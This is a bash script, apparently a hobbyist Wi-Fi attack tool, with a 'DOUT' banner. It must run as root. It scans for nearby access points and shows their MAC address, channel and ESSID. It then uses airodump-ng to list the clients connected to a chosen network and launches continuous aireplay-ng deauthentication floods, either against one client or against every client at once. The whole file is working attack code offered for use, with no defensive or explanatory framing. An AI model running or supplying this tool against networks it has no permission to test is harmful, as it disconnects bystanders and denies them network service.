#!/bin/bash
if ! [[ $( whoami ) == "root" ]] ; then echo -e "\e[1;31m[X] MUST RUN AS ROOT \e[0m" ; exit ; fi ; clear
echo -e "\e[1;31m  ____\e[0m""\e[1;34m     ___  _   _ _____ \e[0m"
echo -e "\e[1;31m |  _ \ \e[0m""\e[1;34m  / _ \| | | |_   _|\e[0m"
echo -e "\e[1;31m | | | \ \e[0m""\e[1;34m| | | | | | | | |\e[0m"
echo -e "\e[1;31m | |_| |\e[0m""\e[1;34m | |_| | |_| | | |\e[0m"
echo -e "\e[1;31m |____/\e[0m""\e[1;34m   \___/ \___/  |_|\e[0m"
echo -e "\e[1;37m  CODED BY MAGDY MOUSTAFA \e[0m"
mkdir workspace
cd workspace


trap " echo "" ; echo '[X] EXIT !' ; kill `pgrep xterm 2> /dev/null` ; cd .. ; rm -rf workspace ; exit " SIGINT SIGTERM
#print avilable interfaces to choose one
for i in $( nmcli | awk {' print $1 '} | grep : | cut -d ":" -f1 ) ; do echo "    [+] $i" ; done
echo -ne "\e[1;31m[?]choose an interface name : \e[0m" ; read interface

function scan_to_list { 
#scan for near access points
sudo iwlist $interface scan | grep -e ESSID: -e Channel: -e Address: > hosts.txt
cat hosts.txt | grep Address: | awk {' print $5 '} > macaddress.txt
cat hosts.txt | grep Channel | cut -d ":" -f2 > channels.txt
cat hosts.txt | grep ESSID: | cut -d "\"" -f2 | cut -d "\"" -f1 | sed 's/^$/NO_NAME/g' > essid.txt
#list_found
list_lines=`wc -l macaddress.txt | awk {'print $1'}` ; x=1
for i in `seq 1 $list_lines` ; do
	echo -ne "\e[1;35m[$x] \e[0m\e[1;31mAddress:\e[0m $( awk NR==$i macaddress.txt ) \t"
	echo -ne "\e[1;33mChannel:\e[0m $( awk NR==$i channels.txt )\t"
	echo -ne "\e[1;34mESSID: \e[0m $( awk NR==$i essid.txt )\t"
	echo "" ; let x+=1 ; done ; ll=$( expr $list_line + 1 )
while true ; do
	echo -ne "\e[1;31m[?]choose target number or type 'rescan' : \e[0m" ; read target
	if [[ "$target" =~ ^[0-9]+$ ]] ; then
		macaddr=$( awk NR==$target macaddress.txt )
		channel=$( awk NR==$target channels.txt )
		essid=$( awk NR==$target essid.txt )
		break
	elif [[ $target == "rescan" ]] ; then
		scan_to_list
	fi
done
}
scan_to_list
function scan_to_attack {
echo -e "\e[1;31m[+] scanning devices on $essid .. please wait \e[0m"
timeout 25 xterm -e bash -c "airodump-ng -c$channel --bssid $macaddr $interface 2> output.txt"
cat output.txt | sort -u | awk {' print $2 '} | grep -v "-" | sort -u | egrep '^.{17}$' > macs.txt
echo -e "\e[1;40m     $(wc -l macs.txt | awk {'print $1'})\e[0m" "\033[33m Devices found \e[0m"
cat -n macs.txt
echo -e "\e[1;31m ::: ATTACKING MODE ::: \e[0m "
echo -e "\e[1;39m1) all .. type 'all' to choose all targets \e[0m"
echo -e "\e[1;39m2) one .. type the target number \e[0m"
echo -e "\e[1;39m3) type rescan to rescan access point\e[0m"
echo -en "\e[1;31m[?]\e[0m" ; read option
if [[ $option == "all" ]] ; then
	for i in $( cat macs.txt ) ; do xterm -e bash -c "aireplay-ng -0 0 -c $i -a $macaddr $interface" &
	done
elif [[ $option == "rescan" ]] ; then scan_to_attack
else op=$( awk NR==$option macs.txt ) ; xterm -e bash -c "aireplay-ng -0 0 -c $op -a $macaddr $interface" ; fi ; wait
} ; scan_to_attack
